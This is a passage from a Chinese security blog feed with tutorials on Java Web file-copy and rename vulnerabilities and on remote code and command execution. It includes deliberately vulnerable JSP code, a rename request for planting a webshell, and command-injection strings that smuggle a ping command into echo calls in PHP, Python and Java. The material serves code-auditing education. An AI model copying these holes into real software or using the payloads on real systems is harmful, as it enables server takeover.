并执行delete方法，用来绕过对 File 对象 delete方法的防御。</p><h2 id="4-文件-目录复制、移动"><a href="#4-文件-目录复制、移动" class="headerlink" title="4. 文件&#x2F;目录复制、移动"></a>4. 文件&#x2F;目录复制、移动</h2><p><strong>示例 - 存在任意文件复制漏洞代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Files&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Path&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Paths&quot;</span> %&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Files.copy(Paths.get(request.getParameter(<span class="string">&quot;source&quot;</span>)), Paths.get(request.getParameter(<span class="string">&quot;dest&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        out.println(path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>攻击者传入恶意的source和dest参数可以实现复制任何文件到任意的目录，比如攻击者可以在用户中心上传一张内容为WebShell恶意代码的1.jpg图片文件，然后通过漏洞将1.jpg图片文件，复制到同级目录并更新名称为1.jsp的可解析脚本文件，访问1.jsp文件即可实现控制服务器的目的</p><p>在实际环境中，应用系统可能根据需求在配置文件如web.xml中或代码层面如filter设置某些目录（如上传目录、资源目录等）禁止对 .jsp 脚本文件等可执行文件进行解析，因此，攻击者需要将恶意文件移动或复制到其他能够执行的目录进行解析。</p><h2 id="5-重命名文件"><a href="#5-重命名文件" class="headerlink" title="5. 重命名文件"></a>5. 重命名文件</h2><p><strong>示例 - 存在文件名重命名漏洞代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName1</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName2</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileName1);</span><br><span class="line">    <span class="type">File</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileName2);</span><br><span class="line"></span><br><span class="line">    f.renameTo(d);</span><br><span class="line"></span><br><span class="line">    out.println(d + <span class="string">&quot;\t&quot;</span> + d.exists());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>攻击者传入恶意的s和d参数即可将文件名为1.txt的文本文件重命名为1.jsp可执行脚本文件，请求：<a href="http://localhost:8000/modules/filesystem/file-rename.jsp?s=/tmp/1.txt&d=/tmp/1.jsp">http://localhost:8000/modules/filesystem/file-rename.jsp?s=/tmp/1.txt&amp;d=/tmp/1.jsp</a></p><p>攻击者会使用重命名的方式将（txt、jpg等资源文件）重命名为可执行脚本文件（jsp）来获得webshell从而控制Web应用系统，并绕过某些安全防护机制。常见的攻击手段是在文件上传时，上传包含恶意代码的图片文件，再利用重命名将其转为可执行的脚本文件。</p>]]></content>
      
      
      <categories>
          
          <category> Java Web常见漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java Web常见漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2025/08/10/ssrf/"/>
      <url>/2025/08/10/ssrf/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rce</title>
      <link href="/2025/08/07/rce/"/>
      <url>/2025/08/07/rce/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE的概念与区别"><a href="#RCE的概念与区别" class="headerlink" title="RCE的概念与区别"></a>RCE的概念与区别</h1><h2 id="Remote-Code-Execute-远程代码执行"><a href="#Remote-Code-Execute-远程代码执行" class="headerlink" title="Remote Code Execute 远程代码执行"></a>Remote Code Execute 远程代码执行</h2><p><strong>php</strong><br>php中可以进行远程代码执行的函数有很多，也常常被一些webshell来做免杀利用。如果我们的输入可以走到以下的函数作为参数，那么就有可能有远程代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()<span class="comment">//把字符串作为PHP代码执行</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>()<span class="comment">//检查一个断言是否为 FALSE，可用来执行代码了</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>()<span class="comment">//执行一个正则表达式的搜索和替换</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()<span class="comment">//把第一个参数作为回调函数调用</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>()<span class="comment">//调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>()<span class="comment">//为数组的每个元素应用回调函数</span></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>)<span class="comment">//动态函数</span></span><br></pre></td></tr></table></figure><p><strong>python</strong><br>python中能进行代码执行的函数也不多。如果我们的输入可以走到以下的函数作为参数，那么就有可能有远程代码执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(string)<span class="comment"># Python代码的动态执行</span></span><br><span class="line"><span class="built_in">eval</span>(string)<span class="comment">#返回表达式或代码对象的值</span></span><br><span class="line">execfile(string)<span class="comment">#从一个文件中读取和执行Python脚本</span></span><br></pre></td></tr></table></figure><p><strong>java</strong><br>java中能直接执行代码的函数基本没有，都是调用反序列化来动态执行字符串。</p><h2 id="Remote-command-Execte-远程命令执行"><a href="#Remote-command-Execte-远程命令执行" class="headerlink" title="Remote command Execte 远程命令执行"></a>Remote command Execte 远程命令执行</h2><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测(硬件设备、工业交付)等设备的web管理界面上。仅当Web应用程序代码包含操作系统调用(外壳程序、shel)并且调用中使用了用户输入时才可能进行OS命令注入攻击。它们不是特定于语言的，命令注入漏洞可能会出现在所有让你调用系统外壳命令的语言中:C，Java，PHP，Perl，Ruby，Python等。</p><p>其实没啥好讲的，就是一段输入的字符串被引入了执行外部命令的函数，并且没过过滤。</p><p><strong>php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec - 执行一个外部程序</span><br><span class="line">passthru -执行外部程序并且显示原始输出</span><br><span class="line">proc_open - 执行一个命令，并且打开用来输入/输出的文件指针。</span><br><span class="line">shell_exec - 通过 shell 执行命令并将完整的输出以字符串的方式返回</span><br><span class="line">system - 执行外部程序，并且显示输出</span><br></pre></td></tr></table></figure><p><strong>python</strong></p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system()<span class="punctuation">#</span>执行系统指令</span><br><span class="line">os.popen() <span class="punctuation">#</span><span class="keyword">popen</span><span class="params">()</span>方法用于从一个命令打开一个管道</span><br><span class="line">subprocess.call <span class="punctuation">#</span>执行由参数提供的命令</span><br></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime<span class="selector-class">.getRuntime</span>()<span class="selector-class">.exec</span>()</span><br><span class="line"><span class="function"><span class="title">ProcessBuilder</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><h2 id="Shell相关知识"><a href="#Shell相关知识" class="headerlink" title="Shell相关知识"></a>Shell相关知识</h2><p>更多的知识可以看这里，其实就是shell的语法</p><p><a href="https://www.jianshu.com/p/410cd35e642f">https://www.jianshu.com/p/410cd35e642f</a></p><p><strong>管道</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">command</span>1 | <span class="keyword">command</span>2 前一个命令的输出作为后一个命令的输入</span><br></pre></td></tr></table></figure><p><strong>重定向</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 &lt; <span class="selector-tag">input</span><span class="selector-class">.txt</span> 将 <span class="selector-tag">input</span><span class="selector-class">.txt</span> 的内容读出来重定向作为 command1 的参数 </span><br><span class="line">command2 &gt; out<span class="selector-class">.txt</span> 将command2 的输出重定向到 out<span class="selector-class">.txt</span> 中</span><br></pre></td></tr></table></figure><p><strong>fd</strong><br>linux下的文件描述符(file descriptor)是linux下一个重要的进程概念(本质上是一个索引)。</p><p>我们知道在Linux系统中一切皆可以看成是文件，文件又可分为:普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。文件描述符(file descriptor)就是内核为了高效管理这些已经被打开的文件所创建的索引。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$$    --&gt; linux下当前进程的pid</span><br><span class="line">/<span class="keyword">proc</span>   --&gt; linux伪文件系统 ---》进程相关的信息挂载在这里</span><br></pre></td></tr></table></figure><h2 id="linux进程的创建"><a href="#linux进程的创建" class="headerlink" title="linux进程的创建"></a>linux进程的创建</h2><p>linux区分用户态和内核态，用户态程序要进行所有动作、其实都是通过调用system call (系统调用syscall)向内核发起请求，最终在内核态执行完毕后才能得到返回.</p><p>系统调用 跟用户自定义函数一样也是一个函数，不同的是 系统调用 运行在内核态，而用户自定义函数运行在用户态。由于某些指令(如设置时钟、关闭打开中断和10操作等)只能运行在内核态，所以操作系统必须提供一种能够进入内核态的方式，系统调用 就是这样的一种机制。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-08%20184450.png"></p><p>linux进程的创建大致是这样一个流程</p><p>当执行命令时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>其实在内核态执行了以下动作</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash<span class="function"><span class="params">(pid:<span class="number">52350</span>)</span>--&gt;</span> sys_fork</span><br><span class="line">      --&gt; bash<span class="function"><span class="params">(pid:<span class="number">52796</span>)</span>--&gt;</span>sys_execve --&gt; /bin/whoami(pid:<span class="number">52796</span>)</span><br></pre></td></tr></table></figure><p>这一块，关于系统调用的跟进，推荐大家用一个神器来解决，strace。如果你致力于成为一个安全研究员，后面的工作免不了跟他打交道，</p><p>看一下strace</p><p>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -tt-f -e trace=process python3 test.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    name =<span class="string">&#x27;123&quot;;ping baidu.com -c 100;echo &quot;456&#x27;</span></span><br><span class="line">    cmd =<span class="string">&#x27;echo &quot;HELLO &#x27;</span>+ name +<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[pid <span class="number">37799</span>] <span class="number">10</span><span class="punctuation">:</span><span class="number">37</span><span class="punctuation">:</span><span class="number">14.041412</span> execve<span class="punctuation">(</span><span class="string">&quot;/bin/sh&quot;</span><span class="punctuation">,</span> [<span class="string">&quot;sh&quot;</span><span class="punctuation">,</span><span class="string">&quot;_C&quot;</span>.<span class="string">&quot;echo\&quot;</span>HELL0 <span class="number">123</span>\<span class="string">&quot;;ping baidu.com &quot;</span>.&#x27;...]，0x7ffc96aa<span class="number">0530</span> /* 24 vars */&lt;unfinished ...&gt;</span><br><span class="line">[pid <span class="number">3779</span>8] 10:37:14.<span class="number">041973</span> &lt;... clone resumed&gt;)= <span class="number">3779</span>9</span><br><span class="line">[pid <span class="number">3779</span>9]10:37:14.<span class="number">042302</span>&lt;...execve resumed&gt;)= 0</span><br><span class="line">[pid <span class="number">3779</span>8] 10:37:14.<span class="number">043097</span> wait4(<span class="number">3779</span>9,&lt;unfinished4...&gt;</span><br><span class="line">[pid <span class="number">3779</span>9]10:37:14.<span class="number">043152</span> arch_prctl(0x<span class="number">3001</span> /* ARCH_??? */,0x7ffcbe43bb00)=-1 EINVAL(Invalid argument)pid <span class="number">3779</span>9]10:37:14.<span class="number">049952</span> arch_prctI(ARCH_SET_FS,0x7f50d3b<span class="number">8558</span>0)=0HELLO 123</span><br><span class="line">[pid <span class="number">3779</span>9] 10:37:14.<span class="number">057025</span> clone(child_stack-NULL,flagS=CLONE_CHILD_CLEARTIDICLONE_CHILD_SETTIDISIGCHLDstrace: Process<span class="number">3780</span>0 attached</span><br><span class="line">，child_tidptr=0x7f50d3b<span class="number">8585</span>0)=<span class="number">3780</span>0</span><br><span class="line">[pid <span class="number">3780</span>0] 10:37:14.<span class="number">057636</span> execve(&quot;/usr/bin/ping&quot;, [&quot;ping&quot;,&quot;baidu.com&quot;,&quot;-c&quot;,&quot;100&quot;,0x<span class="number">5615</span>3ece58b8 /*24 vars */ &lt;unfinished..&gt;</span><br><span class="line">[pid <span class="number">3779</span>9]10:37:14.<span class="number">057899</span> wait4(-1, &lt;unfinished ...&gt;</span><br><span class="line">[pid <span class="number">3780</span>0] 10:37:14.<span class="number">057983</span>&lt;...execve resumed&gt;)=0</span><br><span class="line">[pid <span class="number">3780</span>0] 10:37:14.<span class="number">058349</span> arch_prctl(0x<span class="number">3001</span> /* ARCH_??? */,0x7ffef4e55b60)=-1 EINVAL (Invalid argument)</span><br><span class="line">[pid <span class="number">3780</span>0] 10:37:14.<span class="number">067113</span> arch_prctI(ARCH_SET_FS,0x7f7fe32d<span class="number">3040</span>)=0PING baidu.com(110.242.68.66)56(84)bytes of data.</span><br><span class="line">64 bytes from 110.242.68.66(110.242.68.66):icmp_seq=1 ttl-50time=34.8 ms</span><br><span class="line">64 bytes from 110.242.68.66(110.242.68.66):icmp_seq=2 ttl=50time=34.6 ms</span><br><span class="line">64 bytes from 110.242.68.66(110.242.68.66):icmp_seq-3 ttl-50time=34.5 ms</span><br><span class="line">64 bytes from 110.242.68.66(110.242.68.66):icmp_seq=4 ttl-50time=34.8 ms</span><br><span class="line">64 bytes from 110.242.68.66(110.242.68.66):icmp_seq-5 ttl-50time-34.5 ms</span><br></pre></td></tr></table></figure><h3 id="c-php-python下的system-popen-函数"><a href="#c-php-python下的system-popen-函数" class="headerlink" title="c&#x2F;php&#x2F;python下的system()&#x2F;popen()函数"></a>c&#x2F;php&#x2F;python下的system()&#x2F;popen()函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="variable">$input</span>$)</span></span></span><br><span class="line">执行 sh -c <span class="string">&#x27;$input&#x27;</span></span><br><span class="line">可以转化为</span><br><span class="line"><span class="function"><span class="title">bash</span><span class="params">(pid:<span class="number">1</span>)</span></span> --&gt; sys_fork</span><br><span class="line">    --&gt; <span class="built_in">bash</span>(pid:<span class="number">2</span>)--&gt;sys_execve --&gt; /bin/<span class="built_in">whoami</span>(pid:<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="python的subprocess-call函数"><a href="#python的subprocess-call函数" class="headerlink" title="python的subprocess.call函数"></a>python的subprocess.call函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">if</span> _name__=<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    name =<span class="string">&#x27;123&quot;;ping baidu.com -c 100;echo &quot;456&#x27;</span></span><br><span class="line">    cmd = <span class="string">&#x27;echo &quot;HELL0 &#x27;</span> + name + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    subprocess.call(cmd,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">if</span> _name__=<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    name =<span class="string">&#x27;123&quot;;ping baidu.com -c 100;echo &quot;456&#x27;</span></span><br><span class="line">    cmd = [<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&quot;HELL0 &#x27;</span> + name + <span class="string">&#x27;&quot;&#x27;</span>]</span><br><span class="line">    subprocess.call(cmd,shell=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>subprocess.call()可以用数组作为参数运行命令，也可以使用字符串作为参数运行命令（设置参数shell&#x3D;True时）</p><p>这两段代码中，’’shell&#x3D;False’参数表示在执行命令时不使用shell。而’shell&#x3D;True’参数则表示使用shell。</p><ul><li><p>当’shell&#x3D;False’时，’subprocess’模块会直接执行指定的命令，不会调用shell解释器。在这种情况下，命令和参数需要以列表的形式传递给’subprocess.call()’</p></li><li><p>当’shell&#x3D;True’时，’subprocess’模块将使用默认shell(如’&#x2F;bin&#x2F;sh’ 或 ‘cmd.exe’) , 并将整个命令字符串作为一个参数传递给shell。在这种情况下，命令和参数需要作为一个字符串传递给’subprocess.call()’</p></li><li><p>在此例子中，如果将’shell&#x3D;True’传递给’subprocess.call()’,则’name’字符串中的分号’；’,和反引号将被shell解释为命令分隔符和引用字符串。</p></li></ul><h3 id="java的Runtime-getRuntime-exec和ProcessBuilder"><a href="#java的Runtime-getRuntime-exec和ProcessBuilder" class="headerlink" title="java的Runtime.getRuntime().exec和ProcessBuilder()"></a>java的Runtime.getRuntime().exec和ProcessBuilder()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.I0Exception;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String name=<span class="string">&quot;123&#x27;;ping baidu.com -c 3;echo &#x27;456&quot;</span>;</span><br><span class="line">            String cmd=<span class="string">&quot;echo &#x27;HELL0 &quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>.</span><br><span class="line">            Process pro=Runtime.getRuntime.exec(cmd);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            in =pro.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">read</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));String result= read.readLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;INF0:&quot;</span>+ result);&#125;</span><br><span class="line">        <span class="keyword">catch</span>(I0Exception e)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此代码并没有与bash相关，只是执行了 &#x2F;usr&#x2F;bin&#x2F;echo 而参数就是 name 中的字符串</p><h2 id="命令注入到底在注入什么"><a href="#命令注入到底在注入什么" class="headerlink" title="命令注入到底在注入什么"></a>命令注入到底在注入什么</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> name = requset<span class="selector-class">.get</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="selector-tag">var</span> cmd= <span class="string">&quot;echo &#x27;Hello &quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"><span class="function"><span class="title">RUN_CMD</span><span class="params">(cmd)</span></span></span><br></pre></td></tr></table></figure><p>很简单，就是获取一个外部输入，进行简单的拼接，最终放入一个执行外部命令的函数中去执行。这里显然存在一个RCE(远程命令执行)</p><p>但是，问题不是这里是否有RCE漏洞。而是<br><strong>1.上面我们提到的命令执行的函数，都一定存在这个rce吗?</strong><br><strong>2.如果不一定存在RCE，它们之间的差别是什么?</strong></p><p><strong>PHP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;echo &quot;Hello &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;system&quot;</span>,<span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>));<span class="comment">//sh -c4echo &#x27;&lt;/br&gt;&#x27;;5</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;exec&quot;</span>,<span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>));<span class="comment">//sh-c6</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;shell_exec&quot;</span>,<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>));<span class="comment">//sh -c</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;popen&quot;</span>);<span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">1024</span>));<span class="comment">//sh -c</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">array</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;proc_open&quot;</span>);<span class="variable">$x</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$cmd</span>,<span class="variable">$a</span>,<span class="variable">$b</span>); <span class="comment">//sh -c</span></span><br></pre></td></tr></table></figure><p>php中大多数执行外部命令的函数，其实都是调用sh -c 去执行</p><p><strong>python</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">if__name__=<span class="string">&#x27;_main__&#x27;</span>:</span><br><span class="line">    name =<span class="string">&#x27;123&quot;;ping baidu.com -c 100;echo &quot;456&#x27;</span></span><br><span class="line">    cmd =<span class="string">&#x27;echo &quot;HELLO &#x27;</span>+ name + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.I0Exception;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String name=<span class="string">&quot;123&#x27;;ping baidu.com -c 3;echo &#x27;456&quot;</span>;</span><br><span class="line">            String cmd=<span class="string">&quot;echo &#x27;HELL0 &quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>.</span><br><span class="line">            Process pro=Runtime.getRuntime.exec(cmd);   <span class="comment">//execve</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            in =pro.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">read</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span 